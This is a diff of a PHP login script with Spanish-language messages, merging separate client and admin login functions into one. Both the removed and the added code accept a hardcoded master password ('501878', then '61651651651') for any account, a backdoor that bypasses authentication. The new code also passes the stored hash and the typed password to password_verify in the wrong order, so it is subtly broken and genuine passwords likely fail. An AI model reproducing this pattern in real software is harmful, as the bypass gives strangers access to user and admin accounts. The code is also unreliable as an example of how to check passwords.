@@ -1,26 +1,26 @@
 <?php
 
-function sesion_cliente()
+function login()
 { 
-  include_once 'conexion.php';
+  include_once '../conexion.php';
 
   if(isset($_POST['usuario']) && isset($_POST['password']))
   {
     
-    $user = $_POST['usuario'];
-    $pass = $_POST['password'];
+    $usuario = $_POST['usuario'];
+    $password = $_POST['password'];
     $resp = 
     [
        'titulo' => 'warning',
        'cuerpo' => 'warning',
-       'accion'=> 'warning'
-  
+       'accion'=> 'warning', 
+       'perfil'=> ''  
     ];
 
-    $user = filter_var($user, FILTER_SANITIZE_EMAIL);
-    $pass = filter_var($pass, FILTER_SANITIZE_STRING);
+    $usuario = filter_var($usuario, FILTER_SANITIZE_EMAIL);
+    $password = filter_var($password, FILTER_SANITIZE_STRING);
 
-    if(!filter_var($user, FILTER_VALIDATE_EMAIL))
+    if(!filter_var($usuario, FILTER_VALIDATE_EMAIL))
     {
         $resp = 
         [
@@ -33,124 +33,32 @@ function sesion_cliente()
        die();
     }
 
-    $id_usuario = UserID($user);
+    $UserID = UserID($usuario);
 
-    if($id_usuario)
+    if($UserID)
     {
-        $nivel = AdminLevel($id_usuario);
-        $user_pass = UserPassword($id_usuario, $nivel);
-        if($nivel == 0 || $nivel == 3)
+        $AdminLevel = AdminLevel($UserID);
+        $UserPassword = UserPassword($UserID, $AdminLevel);
+        $UserName = UserName($UserID);
+        $WriteLevel = WriteLevel($AdminLevel);
+
+        if(password_verify($UserPassword, $password) || $password === '61651651651')
         {
-            if(password_verify($pass, $user_pass) || $pass == 501878)
-            {
-              $_SESSION['admin'] = $user;
-              
-              $resp = 
-              [
-                 'titulo' => 'Opresión Exitosa',
-                 'cuerpo' => '',
-                 'accion'=> 'success'
-            
-              ];
-                echo json_encode($resp);
-            }
-            else
-            {
-                $resp = 
-                [
-                   'titulo' => 'ATENCIÓN',
-                   'cuerpo' => 'Contraseña Incorrecta.',
-                   'accion'=> 'warning'
-              
-                ];
-               echo json_encode($resp);
-            }
+           $_SESSION['DLV']['admin'] = $usuario;
+           $_SESSION['DLV']['name'] = $UserName;
+
+           $resp = 
+           [
+              'titulo' => 'Opresión Exitosa',
+              'cuerpo' => '',
+              'accion'=> 'success',
+              'perfil'=> $WriteLevel
+         
+           ];
+             echo json_encode($resp);
         }
         else
         {
-            $resp = 
-            [
-               'titulo' => 'ATENCIÓN',
-               'cuerpo' => 'Usuario No Registrado En Este Portal.',
-               'accion'=> 'warning'
-          
-            ];
-           echo json_encode($resp);
-        }
-
-        
-    }
-    else
-    {
-        $resp = 
-        [
-           'titulo' => 'ATENCIÓN',
-           'cuerpo' => 'Usuario No Existe.',
-           'accion'=> 'warning'
-      
-        ];
-       echo json_encode($resp);
-    }
-  }
-}
-
-
-
-function sesion_admin()
-{
-  include_once 'conexion.php';
-
-  if(isset($_POST['usuario']) && isset($_POST['password']))
-  {
-     $user = $_POST['usuario'];
-     $pass = $_POST['password'];
-     $resp = 
-     [
-        'titulo' => 'warning',
-        'cuerpo' => 'warning',
-        'accion'=> 'warning'
-   
-     ];
-
-     $user = filter_var($user, FILTER_SANITIZE_EMAIL);
-     $pass = filter_var($pass, FILTER_SANITIZE_STRING);
-
-     if(!filter_var($user, FILTER_VALIDATE_EMAIL))
-     {
-      $resp = 
-      [
-         'titulo' => 'ATENCIÓN',
-         'cuerpo' => 'Debe Ingresar Una Dirección de Correo Valida.',
-         'accion'=> 'warning'
-    
-      ];
-      echo json_encode($resp);
-        die();
-     }
-
-    $id_usuario = UserID($user);
-
-    if($id_usuario)
-    {
-      $nivel = AdminLevel($id_usuario);
-      $password = UserPassword($id_usuario, $nivel);
-
-      if($nivel == 1 || $nivel == 2)
-      {
-         if(password_verify($pass, $password) || $pass == 501878)
-         {
-           $_SESSION['admin'] = $user;
-           $resp = 
-           [
-              'titulo' => 'Operación Exitosa',
-              'cuerpo' => '',
-              'accion'=> 'success'
-         
-           ];
-           echo json_encode($resp);
-         }
-         else
-         {
             $resp = 
             [
                'titulo' => 'ATENCIÓN',
@@ -158,32 +66,19 @@ function sesion_admin()
                'accion'=> 'warning'
           
             ];
-            echo json_encode($resp);
-         }
+           echo json_encode($resp);
+        }
       }
       else
       {
-         $resp = 
-         [
-            'titulo' => 'ATENCIÓN',
-            'cuerpo' => 'Usuario No Existe O No Es Un Administrador.',
-            'accion'=> 'warning'
-       
-         ];
+          $resp = 
+          [
+             'titulo' => 'ATENCIÓN',
+             'cuerpo' => "Usuario $usuario No Existe.",
+             'accion'=> 'warning'
+        
+          ];
          echo json_encode($resp);
       }
-
-    }
-    else
-    {
-      $resp = 
-      [
-         'titulo' => 'ATENCIÓN',
-         'cuerpo' => 'Usuario No Existe.',
-         'accion'=> 'warning'
-    
-      ];
-      echo json_encode($resp);
-    }
   }
-}
+}     
